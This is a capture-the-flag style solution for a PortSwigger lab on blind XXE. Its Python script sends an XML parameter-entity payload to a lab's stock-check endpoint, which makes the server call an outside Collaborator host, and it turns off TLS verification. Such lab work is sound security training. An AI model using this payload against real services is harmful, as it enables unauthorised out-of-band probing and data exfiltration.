# Lab: Blind XXE with out-of-band interaction via XML parameter entities

Link to lab: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

## Solution
```python
import requests
import urllib3  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Host': '0af2008a043f7a80c38e29a900a0002d.web-security-academy.net',
    'Content-Type': 'application/xml',
}

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://yikfn9un5au63ryrq5f0jfe1lsrjf93y.oastify.com"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'

response = requests.post(
    'https://0af2008a043f7a80c38e29a900a0002d.web-security-academy.net/product/stock',
    headers=headers,
    data=data,
    verify=False,
)

print(response.text)
```